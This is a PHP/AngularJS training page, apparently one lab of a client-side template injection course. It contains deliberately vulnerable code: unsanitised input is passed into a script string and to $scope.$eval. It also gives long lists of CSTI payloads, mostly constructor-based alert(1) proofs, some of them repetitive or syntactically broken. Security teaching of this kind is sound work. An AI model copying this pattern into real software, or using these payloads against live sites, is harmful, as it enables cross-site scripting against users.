<?php
// Lab 1: Basic Client-side Template Injection
// Vulnerability: Basic CSTI without proper sanitization

session_start();

$message = '';
$user_input = '';
$template_output = '';

// Simulate CSTI vulnerability
function process_csti_input($input) {
    // Vulnerable: Direct template processing without validation
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct template processing without encoding
    return $input;
}

// Handle CSTI
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['process_template'])) {
    $user_input = $_POST['template_input'] ?? '';
    
    if ($user_input) {
        $template_output = process_csti_input($user_input);
        $message = '<div class="alert alert-success">Template processed successfully!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 1: Basic CSTI - Client-side Template Injection Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    <script src="https://cdn.jsdelivr.net/npm/angular@1.8.2/angular.min.js"></script>
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .template-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .csti-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body ng-app="cstiApp" ng-controller="cstiController">
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CSTI Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 1: Basic Client-side Template Injection</h1>
            <p class="hero-subtitle">Basic CSTI without proper sanitization</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates a basic Client-side Template Injection vulnerability where user input is directly processed by Angular template engine without proper sanitization. This allows attackers to inject malicious template expressions.</p>
            <p><strong>Objective:</strong> Inject malicious template expressions to achieve XSS or other security issues.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Direct template processing without validation
function process_csti_input($input) {
    if (empty($input)) {
        return "No input provided.";
    }
    
    // Vulnerable: Direct template processing without encoding
    return $input;
}

// Angular template (vulnerable)
&lt;div ng-bind-html="userInput"&gt;&lt;/div&gt;
&lt;div&gt;{{ userInput }}&lt;/div&gt;</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-slash me-2"></i>CSTI Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="csti-warning">
                            <h5>⚠️ CSTI Warning</h5>
                            <p>This lab demonstrates CSTI vulnerabilities. The following can execute JavaScript:</p>
                            <ul>
                                <li><code>{{ 7*7 }}</code> - Basic expression</li>
                                <li><code>{{ 'a'+'b' }}</code> - String concatenation</li>
                                <li><code>{{ $eval('alert(1)') }}</code> - Code execution</li>
                                <li><code>{{ constructor.constructor('alert(1)')() }}</code> - Constructor injection</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>CSTI Examples</h5>
                            <p>Try these template expressions:</p>
                            <ul>
                                <li><code>{{ 7*7 }}</code> - Math expression</li>
                                <li><code>{{ 'Hello' + 'World' }}</code> - String concatenation</li>
                                <li><code>{{ $eval('alert(1)') }}</code> - Code execution</li>
                                <li><code>{{ constructor.constructor('alert(1)')() }}</code> - Constructor injection</li>
                            </ul>
                        </div>
                        
                        <form method="POST">
                            <input type="hidden" name="process_template" value="1">
                            <div class="mb-3">
                                <label for="template_input" class="form-label">Template Expression</label>
                                <textarea class="form-control" id="template_input" name="template_input" 
                                          rows="4" placeholder="Enter template expression..."><?php echo htmlspecialchars($user_input); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Process Template</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>Template Output
                    </div>
                    <div class="card-body">
                        <div class="template-display">
                            <h5>Angular Template Output</h5>
                            <div ng-bind-html="userInput"></div>
                            <div>{{ userInput }}</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Client-side Template Injection</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Direct template processing without validation</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Test Payloads</h5>
                    <ul>
                        <li><code>{{ 7*7 }}</code> - Math expression</li>
                        <li><code>{{ 'Hello' + 'World' }}</code> - String concatenation</li>
                        <li><code>{{ $eval('alert(1)') }}</code> - Code execution</li>
                        <li><code>{{ constructor.constructor('alert(1)')() }}</code> - Constructor injection</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>CSTI Payloads</h5>
            <p>Use these payloads to test Client-side Template Injection vulnerabilities:</p>
            
            <h6>1. Basic Math Expressions:</h6>
            <div class="code-block">{{ 7*7 }}
{{ 1+1 }}
{{ 10-5 }}
{{ 2*3 }}
{{ 8/2 }}</div>

            <h6>2. String Concatenation:</h6>
            <div class="code-block">{{ 'Hello' + 'World' }}
{{ 'a' + 'b' + 'c' }}
{{ 'XSS' + 'Test' }}
{{ 'CSTI' + 'Vulnerability' }}</div>

            <h6>3. Variable Access:</h6>
            <div class="code-block">{{ $root }}
{{ $parent }}
{{ $scope }}
{{ this }}
{{ self }}</div>

            <h6>4. Function Calls:</h6>
            <div class="code-block">{{ $eval('alert(1)') }}
{{ $eval('console.log(1)') }}
{{ $eval('document.write(1)') }}
{{ $eval('window.alert(1)') }}</div>

            <h6>5. Constructor Injection:</h6>
            <div class="code-block">{{ constructor.constructor('alert(1)')() }}
{{ constructor.constructor('console.log(1)')() }}
{{ constructor.constructor('document.write(1)')() }}
{{ constructor.constructor('window.alert(1)')() }}</div>

            <h6>6. Object Property Access:</h6>
            <div class="code-block">{{ $root.constructor }}
{{ $parent.constructor }}
{{ $scope.constructor }}
{{ this.constructor }}</div>

            <h6>7. Array Access:</h6>
            <div class="code-block">{{ [].constructor }}
{{ [].constructor.constructor }}
{{ [].constructor.constructor('alert(1)')() }}
{{ [].constructor.constructor('console.log(1)')() }}</div>

            <h6>8. String Methods:</h6>
            <div class="code-block">{{ 'a'.constructor }}
{{ 'a'.constructor.constructor }}
{{ 'a'.constructor.constructor('alert(1)')() }}
{{ 'a'.constructor.constructor('console.log(1)')() }}</div>

            <h6>9. Number Methods:</h6>
            <div class="code-block">{{ 1.constructor }}
{{ 1.constructor.constructor }}
{{ 1.constructor.constructor('alert(1)')() }}
{{ 1.constructor.constructor('console.log(1)')() }}</div>

            <h6>10. Boolean Methods:</h6>
            <div class="code-block">{{ true.constructor }}
{{ true.constructor.constructor }}
{{ true.constructor.constructor('alert(1)')() }}
{{ true.constructor.constructor('console.log(1)')() }}</div>

            <h6>11. Function Methods:</h6>
            <div class="code-block">{{ (function(){}).constructor }}
{{ (function(){}).constructor.constructor }}
{{ (function(){}).constructor.constructor('alert(1)')() }}
{{ (function(){}).constructor.constructor('console.log(1)')() }}</div>

            <h6>12. Object Methods:</h6>
            <div class="code-block">{{ {}.constructor }}
{{ {}.constructor.constructor }}
{{ {}.constructor.constructor('alert(1)')() }}
{{ {}.constructor.constructor('console.log(1)')() }}</div>

            <h6>13. Array Methods:</h6>
            <div class="code-block">{{ [].constructor }}
{{ [].constructor.constructor }}
{{ [].constructor.constructor('alert(1)')() }}
{{ [].constructor.constructor('console.log(1)')() }}</div>

            <h6>14. Date Methods:</h6>
            <div class="code-block">{{ Date.constructor }}
{{ Date.constructor.constructor }}
{{ Date.constructor.constructor('alert(1)')() }}
{{ Date.constructor.constructor('console.log(1)')() }}</div>

            <h6>15. Math Methods:</h6>
            <div class="code-block">{{ Math.constructor }}
{{ Math.constructor.constructor }}
{{ Math.constructor.constructor('alert(1)')() }}
{{ Math.constructor.constructor('console.log(1)')() }}</div>

            <h6>16. JSON Methods:</h6>
            <div class="code-block">{{ JSON.constructor }}
{{ JSON.constructor.constructor }}
{{ JSON.constructor.constructor('alert(1)')() }}
{{ JSON.constructor.constructor('console.log(1)')() }}</div>

            <h6>17. RegExp Methods:</h6>
            <div class="code-block">{{ RegExp.constructor }}
{{ RegExp.constructor.constructor }}
{{ RegExp.constructor.constructor('alert(1)')() }}
{{ RegExp.constructor.constructor('console.log(1)')() }}</div>

            <h6>18. Error Methods:</h6>
            <div class="code-block">{{ Error.constructor }}
{{ Error.constructor.constructor }}
{{ Error.constructor.constructor('alert(1)')() }}
{{ Error.constructor.constructor('console.log(1)')() }}</div>

            <h6>19. Promise Methods:</h6>
            <div class="code-block">{{ Promise.constructor }}
{{ Promise.constructor.constructor }}
{{ Promise.constructor.constructor('alert(1)')() }}
{{ Promise.constructor.constructor('console.log(1)')() }}</div>

            <h6>20. Advanced Payloads:</h6>
            <div class="code-block">{{ $eval('$eval("alert(1)")') }}
{{ $eval('constructor.constructor("alert(1)")()') }}
{{ $eval('$root.constructor.constructor("alert(1)")()') }}
{{ $eval('$parent.constructor.constructor("alert(1)")()') }}</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Cross-Site Scripting (XSS) attacks</li>
                <li>Data theft and sensitive information disclosure</li>
                <li>Session hijacking and account takeover</li>
                <li>Malicious redirects and phishing attacks</li>
                <li>Keylogging and form hijacking</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper input validation and sanitization</li>
                    <li>Use Content Security Policy (CSP) to prevent code execution</li>
                    <li>Implement proper output encoding</li>
                    <li>Use whitelist-based filtering for allowed template expressions</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual template processing patterns</li>
                    <li>Use Angular's built-in sanitization features</li>
                    <li>Implement proper template sandboxing</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        var app = angular.module('cstiApp', []);
        app.controller('cstiController', function($scope, $sce) {
            $scope.userInput = '<?php echo addslashes($template_output); ?>';
            
            // Vulnerable: Direct template processing without sanitization
            $scope.$watch('userInput', function(newValue) {
                if (newValue) {
                    // Vulnerable: Direct evaluation without validation
                    try {
                        $scope.processedValue = $scope.$eval(newValue);
                    } catch (e) {
                        $scope.processedValue = 'Error: ' + e.message;
                    }
                }
            });
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
